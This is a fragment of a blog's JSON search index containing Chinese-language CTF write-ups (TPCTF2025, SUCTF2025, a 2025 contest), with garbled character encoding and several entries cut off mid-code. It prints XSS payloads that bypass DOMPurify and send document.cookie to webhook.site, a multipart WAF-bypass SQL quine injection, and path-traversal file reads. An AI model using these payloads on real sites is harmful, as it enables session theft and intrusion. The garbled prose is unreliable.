","date":"2025-03-11","objectID":"/posts/c1e7c5b/:1:0","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"Web\r","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:0","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"baby layout\ræ€è·¯å¾ˆæ¸…æ¥šï¼Œå¯ä»¥å†™ content å’Œ layout ï¼Œç„¶åbotè®¿é—®æŒ‡å®š url æ—¶ä¼šå°† flag æ³¨å…¥åˆ°è®¿é—®çš„çš„é‚£ä¸ªç½‘é¡µçš„ cookie ä¸­ï¼Œæ‰“ xss å¸¦ cookieã€‚å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å¯¹ content å’Œ layout çš„å†…å®¹éƒ½æ˜¯ç”¨ DOMPurify.sanitize() æ¥è¿›è¡Œäº†ä¸ªè¿‡æ»¤ï¼Œè€Œä¸”å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­çœ‹åˆ° dompurify ç‰ˆæœ¬ä¸º 3.2.4ï¼Œåº”è¯¥ä¸æ˜¯æ‰“ 0day æˆ‘ä»¬è¿™é‡Œé‡ç‚¹çœ‹ä¸‹ content å’Œ layout çš„å®ç° app.post('/api/post', (req, res) =\u003e { const { content, layoutId } = req.body; if (typeof content !== 'string' || typeof layoutId !== 'number') { return res.status(400).send('Invalid params'); } if (content.length \u003e LENGTH_LIMIT) return res.status(400).send('Content too long'); const layout = req.session.layouts[layoutId]; if (layout === undefined) return res.status(400).send('Layout not found'); const sanitizedContent = DOMPurify.sanitize(content); //å°† layout ä¸­çš„ {{content}} æ›¿æ¢ä¸º content çš„å€¼ const body = layout.replace(/\\{\\{content\\}\\}/g, () =\u003e sanitizedContent); if (body.length \u003e LENGTH_LIMIT) return res.status(400).send('Post too long'); const id = randomBytes(16).toString('hex'); posts.set(id, body); req.session.posts.push(id); console.log(`Post ${id} ${Buffer.from(layout).toString('base64')} ${Buffer.from(sanitizedContent).toString('base64')}`); return res.json({ id }); }); app.post('/api/layout', (req, res) =\u003e { const { layout } = req.body; if (typeof layout !== 'string') return res.status(400).send('Invalid param'); if (layout.length \u003e LENGTH_LIMIT) return res.status(400).send('Layout too large'); const sanitizedLayout = DOMPurify.sanitize(layout); const id = req.session.layouts.length; req.session.layouts.push(sanitizedLayout); return res.json({ id }); }); å¯ä»¥çœ‹åˆ°åœ¨ content çš„å®ç°ä¸­æ˜¯å…ˆæ£€æµ‹å†æ›¿æ¢ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°† payload åˆ†ä¸ºä¸¤æ®µï¼Œä¸€æ®µå†™å…¥ layout ï¼Œå¹¶å°†ä¼šè¢«è¿‡æ»¤çš„éƒ¨åˆ†æ›¿æ¢ä¸º {{content}}ï¼Œç¬¬äºŒæ®µå†™å…¥ contentï¼Œå€¼å°±ä¸ºä¼šè¢«è¿‡æ»¤çš„éƒ¨åˆ†ï¼Œè¿™æ ·çš„è¯ content å’Œ layout éƒ½å¯ä»¥ç»•è¿‡ DOMPurify.sanitize() çš„æ£€æµ‹ï¼Œè€Œä¸”ä¹Ÿä¼šå°† content çš„å€¼æ‹¼å…¥ layout ä¸­ï¼Œå½¢æˆæœ€åçš„æ¶æ„ payloadã€‚è€Œä¹‹æ‰€ä»¥ content çš„å€¼ä¸ä¼šè¢«è¿‡æ»¤ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰å½¢æˆä¸€ä¸ªå®Œæ•´çš„ html ï¼Œæ²¡è¢«æ£€æµ‹åˆ°ï¼Œå¯ä»¥åœ¨å®˜æ–¹çš„github ä¸Šæ‰¾åˆ°ä¸ª demo æ¥æµ‹è¯•ä¸€ä¸‹ï¼šDOMPurify 3.2.4 â€œShipwreckâ€ å¯ä»¥çœ‹åˆ°ç¬¬äºŒæ¬¡å°±è¢«è¿‡æ»¤äº†è€Œç¬¬ä¸€æ¬¡å´æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¼¹ä¸ªçª—å…ˆ layout ä¸º \u003caudio src={{content}}\u003e content ä¸º \"a\" onloadstart=\"alert(1)\" create post å°±å¼¹çª—äº† æºç ä¹Ÿå¯ä»¥çœ‹åˆ°æ˜¯æˆåŠŸæ’å…¥äº†çš„ å¸¦ä¸‹ cookie \"a\" onloadstart=\"fetch('https://webhook.site/98df9897-f596-4e4b-9994-3ee26ff59249?f=' + document.cookie)\" åé¢ä¸¤é“åŠ å¼ºé¢˜éƒ½å¯ä»¥å‚è€ƒï¼šhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:1","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout*\råŠ å¼ºäº†è¿‡æ»¤ å°† ALLOWED_ATTR ç½®ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½å¼•ç”¨å±æ€§ï¼Œä½†è·Ÿè¿›åä¼šå‘ç°è¿˜å¯ä»¥ç”¨ ALLOW_DATA_ATTR å’Œ ALLOW_ARIA_ATTR ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¾ç„¶å¯ä»¥ç”¨è‡ªå®šä¹‰çš„ dataï¼Œåæ¥æ¶æ„ä»£ç å³å¯ layout \u003caudio data-a={{content}}\u003e content a\" src=\"a\" onloadstart=\"fetch('https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=' + document.cookie)\" å¿…é¡»æœ‰ src å±æ€§ï¼Œä¸ç„¶ä¼šæŠ¥é”™ ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:2","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout revenge*\rè¿™é“å°±ä¿®å¤äº†ä¸Šé¢çš„éé¢„æœŸï¼ŒæŠŠ ALLOW_ARIA_ATTR å’Œ ALLOW_DATA_ATTR éƒ½è®¾ä¸ºäº† false ä» å‡ºé¢˜äººçš„wp ä¸­çœ‹åˆ°dompurifyéå¸¸ä¸¥æ ¼ï¼Œ\u003cstyle\u003eä¸­çš„ä»»ä½•HTMLæ ‡ç­¾éƒ½å°†è¢«è¿‡æ»¤ã€‚ä½†æ˜¯ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä»…æ£€æŸ¥ /\u003c[/\\ w]/ ï¼Œå› æ­¤ä¸ä¼šè¿‡æ»¤ \u003c{{content}} ï¼Œå¯ä»¥ç”¨å…¶æ¥ç»•è¿‡æ¶æ„çš„æ ‡ç­¾ ä½†ä¸èƒ½ç›´æ¥å†™åœ¨ style æ ‡ç­¾é‡Œï¼Œå› ä¸º style æ ‡ç­¾ä¸­çš„ä¼šè¢«å½“ä½œ css è§£æï¼Œæ‰€ä»¥æŠŠ {{content}} åŒ…è£¹åœ¨ style ä¾¿ç­¾é‡Œå³å¯ï¼Œç¬¬ä¸€ä¸ª {{content}} æ˜¯ç”¨æ¥é—­åˆç¬¬ä¸€ä¸ª style æ ‡ç­¾çš„ï¼Œè€Œå‰é¢çš„ a çš„è¯æ˜¯å¼€ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹ï¼Œå¹²æ‰°htmlè§£æè§„åˆ™å•¥çš„ï¼Œæ²¡å¤ªæ‡‚ï¼Œä½†æ˜¯ä¸åŠ å°±ä¼šè§£æå¤±è´¥ layout a\u003cstyle\u003e{{content}}\u003c{{content}}\u003c/style\u003e content img src=\"a\" onerror=fetch(`https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=`+document.cookie) \u003cstyle\u003e\u003c/style\u003e ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:3","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"supersqli\rmanage.py åŠ ä¸ªå‚æ•°å¯åŠ¨æœåŠ¡å™¨ï¼Œæ–¹ä¾¿è°ƒè¯• if len(sys.argv) == 1: sys.argv.append(\"runserver\") åœ¨ supersqli\\web_deploy\\src\\blog\\views.py æ–‡ä»¶ä¸­çš„ flag å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨ sql æ³¨å…¥ ä½†æ˜¯ supersqli\\web_deploy\\simplewaf\\main.go ä¸­çš„ waf é™åˆ¶çš„å¾ˆæ­» var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) var hotfixPattern = regexp.MustCompile(`(?i)(select)`) æ³¨æ„åˆ°åœ¨ go ä¸­åŠ äº†ä¸ªåˆ¤æ–­ï¼Œåˆ¤æ–­ mediaType æ˜¯å¦ä¸º multipart/form-data æ‰¾åˆ°ä¸€ç¯‡æœ‰å…³åˆ©ç”¨ multipart/form-data è§£æå·®å¼‚å®ç°ç»•è¿‡çš„æ–‡ç« ï¼šhttps://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/ ä½†æ–‡ç« ä¸­ç”¨çš„æ˜¯ flask æ¡†æ¶ï¼Œè²Œä¼¼åœ¨è¿™é‡Œçš„ Django ä¸­è¡Œä¸é€šï¼Œçœ‹ä¸‹ Django æ¡†æ¶ä¸­å¯¹ multipart/form-data å¤„ç†ï¼Œè·Ÿè¿›åˆ° multipartparser.py ä¸­å¯ä»¥å‘ç° Django æ˜¯é€šè¿‡è¯·æ±‚å¤´ä¸­çš„ Content-Disposition å­—æ®µæ¥åŒºåˆ†æ¯ä¸ªå­—æ®µ è€Œåœ¨ go ä¸­çš„ request.go çš„ multipartReader å‡½æ•°ä¸­ func (r *Request) multipartReader(allowMixed bool) (*multipart.Reader, error) { v := r.Header.Get(\"Content-Type\") if v == \"\" { return nil, ErrNotMultipart } if r.Body == nil { return nil, errors.New(\"missing form body\") } d, params, err := mime.ParseMediaType(v) if err != nil || !(d == \"multipart/form-data\" || allowMixed \u0026\u0026 d == \"multipart/mixed\") { return nil, ErrNotMultipart } boundary, ok := params[\"boundary\"] if !ok { return nil, ErrMissingBoundary } return multipart.NewReader(r.Body, boundary), nil } å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ç”¨ boundary çš„å€¼æ¥åˆ†éš” multipart è¯·æ±‚ä¸­çš„å„ä¸ªéƒ¨åˆ†ï¼Œæˆªæ­¢ç¬¦çš„è¯å½“ç„¶å°±æ˜¯ boundary çš„å€¼åŠ ä¸Š -- äº† ç»è¿‡ä¸Šé¢çš„åˆ†ææˆ‘ä»¬å‘ç° go å’Œ Django ä¸­ç”¨æ¥åŒºåˆ†ä¸åŒå­—æ®µçš„æ–¹æ³•æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªè§£æå·®å¼‚æ¥ç»•è¿‡ waf ï¼Œè¯·æ±‚æ˜¯å…ˆç»è¿‡ go å¤„ç†å†ç»è¿‡ Django çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç”¨ --boundary-- æ¥æˆªæ­¢ï¼Œç„¶åå†ä¼  password çš„å€¼ã€‚å½“è¯·æ±‚ä½“ä¸º Content-Type: multipart/form-data; boundary=----xxx Content-Length: 137 ------xxx Content-Disposition: form-data; name=\"username\" admin ------xxx-- Content-Disposition: form-data; name=\"password\"; 111 go åªä¼šè§£æ ------xxx-- å‰çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¿”å› è¯·æ±‚çš„ POST å‚æ•°: username = admin è€Œ Django åˆ™ä¼šè¿”å›ä¸¤ä¸ªå‚æ•°çš„å€¼ è¯·æ±‚çš„ POST å‚æ•°: username = admin password = 111 åé¢ sql æ³¨å…¥çš„è¯æ˜¯æ‰“ sqliteï¼Œç›²æ³¨ä¸çŸ¥é“ä¸ºå•¥æ‰“ä¸äº†ï¼Œç„¶åå‘ç°èƒ½æ‰“ quine æ³¨å…¥ï¼Œè¿™é‡Œåªåˆ¤æ–­äº†ä¼ å…¥çš„ password æ˜¯å¦ç›¸åŒï¼Œç¡®å®ä¹Ÿæ¯”è¾ƒç¬¦åˆå…¶åˆ©ç”¨åœºæ™¯ï¼Œç”¨æ–‡ç« ä¸­çš„è„šæœ¬æ„é€ ä¸‹ payloadï¼šhttps://blog.csdn.net/qq_35782055/article/details/130348274ï¼Œç¨å¾®æ”¹ä¸‹ï¼Œæ²¡è¿‡æ»¤ç©ºæ ¼ï¼Œä¸ç”¨ repalce ä¸º /**/ sql = input (\"è¾“å…¥ä½ çš„sqlè¯­å¥,ä¸ç”¨å†™å…³é”®æŸ¥è¯¢çš„ä¿¡æ¯ å½¢å¦‚ 1'union select #\\n\") sql2 = sql.replace(\"'\",'\"') base = \"replace(replace('.',char(34),char(39)),char(46),'.')\" final = \"\" def add(string): if (\"--+\" in string): tem = string.split(\"--+\")[0] + base + \"--+\" if (\"#\" in string): tem = string.split(\"#\")[0] + base + \"#\" return tem def patch(string,sql): if (\"--+\" in string): return sql.split(\"--+\")[0] + string + \"--+\" if (\"#\" in string): return sql.split(\"#\")[0] + string + \"#\" res = patch(base.replace(\".\",add(sql2)),sql).replace(\"'.'\",'\".\"') print(res) æœ€åç»å°è¯•å‘ç°æ˜¯ä¸¤åˆ—ï¼Œå› æ­¤ä¼ å…¥ 1' union select 1,2,--+ ï¼Œå¾—åˆ° payload 1' union select 1,2,replace(replace('1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+',char(34),char(39)),char(46),'1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+')--+ ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:4","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"å‰è¨€\rå¥½å¤šé¢˜ï¼Œè´¨é‡å¾ˆé«˜ï¼Œmiscæ²¡æ€ä¹ˆçœ‹ï¼Œå…¨åœ¨çœ‹webï¼ŒJavaè¿˜æ˜¯æ‰“ä¸åŠ¨ğŸ˜¿ï¼Œè¿˜æœ‰ä¸€äº›å…³äºäº‘çš„ï¼Œä¹Ÿä¸ä¼šï¼Œå…ˆè´´ä¸€ä¸‹å†™äº†çš„wpï¼Œpopå½“æ—¶æ²¡åšï¼Œå…¶ä»–é¢˜ä¹‹åæœ‰ç©ºå¤ç°ä¸€ä¸‹ ","date":"2025-01-14","objectID":"/posts/48766ef/:1:0","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Misc\r","date":"2025-01-14","objectID":"/posts/48766ef/:2:0","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_checkin\ræ‰¾åˆ°ä¸ªpasswordï¼šSePassWordLen23SUCT åŠ å¯†æ–¹å¼ï¼šPBEWithMD5AndDES æ„Ÿè§‰hackerè¿™ä¸ªç”¨æˆ·é‡Œçš„å¯†ç å°±æ˜¯ç›ï¼Œä½†æ˜¯çˆ†ç ´å‡ºæ¥æ˜¯ hackerï¼ˆæ€ä¹ˆä¸æ˜¯8ä½ï¼‰ è¿­ä»£æ¬¡æ•°åº”è¯¥æ˜¯é»˜è®¤çš„1000ï¼Œä¸è¡Œçš„è¯çˆ†ç ´ä¹Ÿè¡Œï¼ŒOUTPUTåº”è¯¥å°±æ˜¯å¯†æ–‡ï¼šElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg= åæ¥å‘ç°ä¸ç”¨ç›ä¹Ÿå¯ä»¥è§£å¯†ï¼Œå¯†ç SePassWordLen23SUCTå…¶å®æ˜¯æš—ç¤ºå¯†ç lengthä¸º23ï¼Œå…¶å®åº”è¯¥æ˜¯SUCTFï¼Œç…§ç€åŠ å¯†è„šæœ¬ï¼šhttps://blog.csdn.net/iin729/article/details/128432332ï¼Œå«aiå†™äº†ä¸ªpythonè§£å¯†è„šæœ¬ import base64 import hashlib import re import itertools import string from Crypto.Cipher import DES def get_derived_key(password, salt, count): key = password + salt for i in range(count): m = hashlib.md5(key) key = m.digest() return (key[:8], key[8:]) def decrypt(msg, password): msg_bytes = base64.b64decode(msg) salt = msg_bytes[:8] enc_text = msg_bytes[8:] (dk, iv) = get_derived_key(password, salt, 1000) crypter = DES.new(dk, DES.MODE_CBC, iv) text = crypter.decrypt(enc_text) # Remove padding at the end, if any return re.sub(r'[\\x01-\\x08]', '', text.decode(\"utf-8\", errors=\"ignore\")) def brute_force_decrypt(ciphertext, prefix, length, charset): # Calculate the number of missing characters missing_length = length - len(prefix) # Generate all possible combinations of the missing characters for combination in itertools.product(charset, repeat=missing_length): # Construct the full password password = prefix + ''.join(combination) try: # Attempt to decrypt the ciphertext decrypted_text = decrypt(ciphertext, password.encode(\"utf-8\")) # Check if the decrypted text contains \"SUCTF\" if \"SUCTF\" in decrypted_text: print(f\"Found valid password: {password}\") print(f\"Decrypted text: {decrypted_text}\") return password, decrypted_text except Exception as e: # If decryption fails, just continue to the next combination continue print(\"No valid password found.\") return None, None def main(): # Known prefix of the password prefix = \"SePassWordLen23SUCTF\" # Total length of the password length = 23 # Character set to use for the missing characters (alphanumeric) charset = string.ascii_letters + string.digits # Ciphertext to decrypt ciphertext = \"ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=\" # Start brute-forcing password, decrypted_text = brute_force_decrypt(ciphertext, prefix, length, charset) if password: print(f\"Success! Password: {password}\") print(f\"Decrypted text: {decrypted_text}\") if __name__ == \"__main__\": main() ","date":"2025-01-14","objectID":"/posts/48766ef/:2:1","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_RealCheckin\rhello ctf -\u003e ğŸ ğŸ¦…ğŸ‹ğŸ‹ğŸŠ ğŸˆğŸŒ®ğŸŸ $flag -\u003e ğŸâ˜‚ï¸ğŸˆğŸŒ®ğŸŸ{ğŸ‹ğŸ¦…ğŸ‹ğŸˆğŸŠğŸ”ï¸ğŸ¦…_ğŸŒ®ğŸŠ_ğŸâ˜‚ï¸ğŸˆğŸŒ®ğŸŸ_ğŸ§¶ğŸŠâ˜‚ï¸_ğŸˆğŸğŸŒƒ_ğŸŒˆğŸ¦…ğŸğŸ‹ğŸ‹ğŸ§¶_ğŸ¬ğŸğŸŒƒğŸˆğŸ¦…} $flag å‰äº”ä¸ªä¸ºsuctfï¼Œæ ¹æ®æ˜ å°„å…³ç³»æœ€åå¤§æ‹¬å·é‡Œé¢çš„æ¨æ–­å‡ºæ¥æ˜¯ ? e l c o ? e _ t o _ s u c t f _ ? o u _ c ? ? _ r e ? l l ? _ d ? ? c e å…¶å®ç¬¬ä¸€æ®µå¾ˆæ˜æ˜¾æ˜¯welcomeï¼Œå¯ä»¥å‘ç°è¯¥emojiä»£è¡¨çš„ä¸œè¥¿çš„è‹±æ–‡é¦–å­—æ¯å°±æ˜¯è¯¥emojiä»£è¡¨çš„å­—ç¬¦ï¼Œæ•…æœ€åflagä¸º suctf{welcome_to_suctf_you_can_really_dance} ","date":"2025-01-14","objectID":"/posts/48766ef/:2:2","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Web\r","date":"2025-01-14","objectID":"/posts/48766ef/:3:0","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_blog\rarticles ç›®å½•æœ‰ç›®å½•ç©¿è¶Šï¼Œè¯»å¯åŠ¨å‘½ä»¤ï¼ŒåŒå†™ç»•è¿‡ä¸€ä¸‹ article?file=articles/....//....//....//....//....//....//proc/self/cmdline æ‹¿åˆ°pythonapp/app.pyï¼Œæ‹¿æºç  article?file=articles/....//....//app/app.py æºç  from flask import * import time,os,json,hashlib from pydash import set_ from waf import pwaf,cwaf app = Flask(__name__) app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\"testuser\": \"password\"} BASE_DIR = '/var/www/html/myblog/app' articles = { 1: \"articles/article1.txt\", 2: \"articles/article2.txt\", 3: \"articles/article3.txt\" } friend_links = [ {\"name\": \"bkf1sh\", \"url\": \"https://ctf.org.cn/\"}, {\"name\": \"fushuling\", \"url\": \"https://fushuling.com/\"}, {\"name\": \"yulate\", \"url\": \"https://www.yulate.com/\"}, {\"name\": \"zimablue\", \"url\": \"https://www.zimablue.life/\"}, {\"name\": \"baozongwi\", \"url\": \"https://baozongwi.xyz/\"}, ] class User(): def __init__(self): pass user_data = User() @app.route('/') def index(): if 'username' in session: return render_template('blog.html', articles=articles, friend_links=friend_links) return redirect(url_for('login')) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username in users and users[username] == password: session['username'] = username return redirect(url_for('index')) else: return \"Invalid credentials\", 403 return render_template('login.html') @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] users[username] = password return redirect(url_for('login')) return render_template('register.html') @app.route('/change_password', methods=['GET', 'POST']) def change_password(): if 'username' not in session: return redirect(url_for('login')) if request.method == 'POST': old_password = request.form['old_password'] new_password = request.form['new_password'] confirm_password = request.form['confirm_password'] if users[session['username']] != old_password: flash(\"Old password is incorrect\", \"error\") elif new_password != confirm_password: flash(\"New passwords do not match\", \"error\") else: users[session['username']] = new_password flash(\"Password changed successfully\", \"success\") return redirect(url_for('index')) return render_template('change_password.html') @app.route('/friendlinks') def friendlinks(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) return render_template('friendlinks.html', links=friend_links) @app.route('/add_friendlink', methods=['POST']) def add_friendlink(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) name = request.form.get('name') url = request.form.get('url') if name and url: friend_links.append({\"name\": name, \"url\": url}) return redirect(url_for('friendlinks')) @app.route('/delete_friendlink/\u003cint:index\u003e') def delete_friendlink(index): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) if 0 \u003c= index \u003c len(friend_links): del friend_links[index] return redirect(url_for('friendlinks')) @app.route('/article') def article(): if 'username' not in session: return redirect(url_for('login')) file_name = request.args.get('file', '') if not file_name: return render_template('article.html', file_name='', content=\"æœªæä¾›æ–‡ä»¶åã€‚\") blacklist = [\"waf.py\"] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template('article.html', file_name=file_name, content=\"å¤§é»‘é˜”ä¸è®¸çœ‹\") if not file_name.startswith('articles/'): return render_template('article.html', file_name=file_name, content=\"æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\") if file_name not in articles.values(): if session.get('username') != 'admin': return render_template('article.html', file_name=file_name, content=\"æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\") file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace('../', '') try: with open(file_path, 'r', encoding='ut","date":"2025-01-14","objectID":"/posts/48766ef/:3:1","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_photogallery\r404é¡µé¢ å‚è€ƒ [FSCTF 2023]ç­¾åˆ°plus å°è¯•æ‰“ä¸‹ phpï¼œ= 7 . 4 . 21 development serveræºç æ³„éœ²ï¼Œå…¶å®éšä¾¿è®¿é—®ä¸€ä¸‹å°±å‡ºæºç äº† unzip.php \u003c?php error_reporting(0); function get_extension($filename){ return pathinfo($filename, PATHINFO_EXTENSION); } function check_extension($filename,$path){ $filePath = $path . DIRECTORY_SEPARATOR . $filename; if (is_file($filePath)) { $extension = strtolower(get_extension($filename)); if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) { if (!unlink($filePath)) { // echo \"Fail to delete file: $filename\\n\"; return false; } else{ // echo \"This file format is not supported:$extension\\n\"; return false; } } else{ return true; } } else{ // echo \"nofile\"; return false; } } function file_rename ($path,$file){ $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file); $oldPath = $path . DIRECTORY_SEPARATOR . $file; $newPath = $path . DIRECTORY_SEPARATOR . $randomName; if (!rename($oldPath, $newPath)) { unlink($path . DIRECTORY_SEPARATOR . $file); // echo \"Fail to rename file: $file\\n\"; return false; } else{ return true; } } function move_file($path,$basePath){ foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) { $destination = $basePath . DIRECTORY_SEPARATOR . basename($file); if (!rename($file, $destination)){ // echo \"Fail to rename file: $file\\n\"; return false; } } return true; } function check_base($fileContent){ $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info']; $base64_keywords = []; foreach ($keywords as $keyword) { $base64_keywords[] = base64_encode($keyword); } foreach ($base64_keywords as $base64_keyword) { if (strpos($fileContent, $base64_keyword)!== false) { return true; } else{ return false; } } } function check_content($zip){ for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (preg_match('/\\.\\.(\\/|\\.|%2e%2e%2f)/i', $fileName)) { return false; } // echo \"Checking file: $fileName\\n\"; $fileContent = $zip-\u003egetFromName($fileName); if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) { // echo \"Don't hack me!\\n\"; return false; } else { continue; } } return true; } function unzip($zipname, $basePath) { $zip = new ZipArchive; if (!file_exists($zipname)) { // echo \"Zip file does not exist\"; return \"zip_not_found\"; } if (!$zip-\u003eopen($zipname)) { // echo \"Fail to open zip file\"; return \"zip_open_failed\"; } if (!check_content($zip)) { return \"malicious_content_detected\"; } $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999)); $path = $basePath . DIRECTORY_SEPARATOR . $randomDir; if (!mkdir($path, 0777, true)) { // echo \"Fail to create directory\"; $zip-\u003eclose(); return \"mkdir_failed\"; } if (!$zip-\u003eextractTo($path)) { // echo \"Fail to extract zip file\"; $zip-\u003eclose(); } for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (!check_extension($fileName, $path)) { // echo \"Unsupported file extension\"; continue; } if (!file_rename($path, $fileName)) { // echo \"File rename failed\"; continue; } } if (!move_file($path, $basePath)) { $zip-\u003eclose(); // echo \"Fail to move file\"; return \"move_failed\"; } rmdir($path); $zip-\u003eclose(); return true; } $uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/'; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); } if (isset($_FILES['file']) \u0026\u0026 $_FILES['file']['error'] === UPLOAD_ERR_OK) { $uploadedFile = $_FILES['file']; $zipname = $uploadedFile['tmp_name']; $path = $uploadDir; $result = unzip($zipname, $path); if ($result === true) { header(\"Location: index.html?status=success\"); exit(); } else { header(\"Loca","date":"2025-01-14","objectID":"/posts/48766ef/:3:2","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"å‰è¨€\ræ¯”èµ›æ—¶é—´æœ‰ç‚¹é˜´é—´ï¼Œé¢˜ç›®çš„è¯å…¨æ˜¯äºŒè¿›åˆ¶ï¼Œèƒ½çœ‹çš„é¢˜å°±åªæœ‰ä¸‰é“ï¼ŒJavaå¬è¯´æ˜¯ä¸ª1dayï¼Œæ‘†äº† ","date":"2025-01-07","objectID":"/posts/6c39531/:1:0","tags":["CTF"],"title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›åˆèµ›2025éƒ¨åˆ†wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"é’“é±¼é‚®ä»¶\rè®°äº‹æœ¬æ‰“å¼€æ˜¯ä¸€å¤§ä¸²base64ç¼–ç ï¼Œè§£ç åæ˜¯ä¸ªzipï¼Œä¸‹è½½ä¸‹æ¥çˆ†ç ´å¯†ç ï¼Œæœ€åå¯†ç ä¸º 20001111ï¼Œå¾—åˆ°ä¸ªexeï¼Œæ‹¿åˆ°å¥‡å®‰ä¿¡åœ¨çº¿æ²™ç®±å‡º å°è¯•åå‘ç°æ˜¯222.218.218.218é‚£ä¸ªï¼Œmd5ä¸€ä¸‹å°±è¡Œ ","date":"2025-01-07","objectID":"/posts/6c39531/:2:0","tags":["CTF"],"title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›åˆèµ›2025éƒ¨åˆ†wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"CachedVisitor\rmain.lua local function read_file(filename) local file = io.open(filename, \"r\") if not file then print(\"Error: Could not open file \" .. filename) return nil end local content = file:read(\"*a\") file:close() return content end local function execute_lua_code(script_content) local lua_code = script_content:match(\"##LUA_START##(.-)##LUA_END##\") if lua_code then local 